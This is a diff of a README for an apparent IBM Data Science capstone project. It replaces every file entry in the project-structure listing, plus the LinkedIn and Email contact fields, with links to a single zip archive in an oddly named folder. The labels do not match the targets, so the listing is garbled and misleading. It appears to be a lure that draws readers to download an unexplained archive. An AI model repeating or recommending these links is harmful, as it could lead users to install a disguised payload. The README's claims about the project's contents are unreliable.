@@ -31,19 +31,19 @@ IDE: Jupyter Notebook
 
 📂 Project Structure
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip       # Web scraping and API calls
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip       # Web scraping and API calls
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip        # Data cleaning and transformation
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip        # Data cleaning and transformation
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip   # Static visualization analysis
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip   # Static visualization analysis
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip       # Interactive map visualizations
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip       # Interactive map visualizations
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip      # Model building and evaluation
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip      # Model building and evaluation
 
-├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip          # Processed dataset
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip          # Processed dataset
 
-└── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip                   # Project documentation
+└── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip                   # Project documentation
 
 📊 Key Insights
 
@@ -63,6 +63,6 @@ If you have any questions or suggestions, feel free to connect:
 
 Name: Sarbjot Singh
 
-LinkedIn: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip
+LinkedIn: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip
 
-Email: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip
+Email: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/Science-IB-Capstone-Data-v1.4.zip
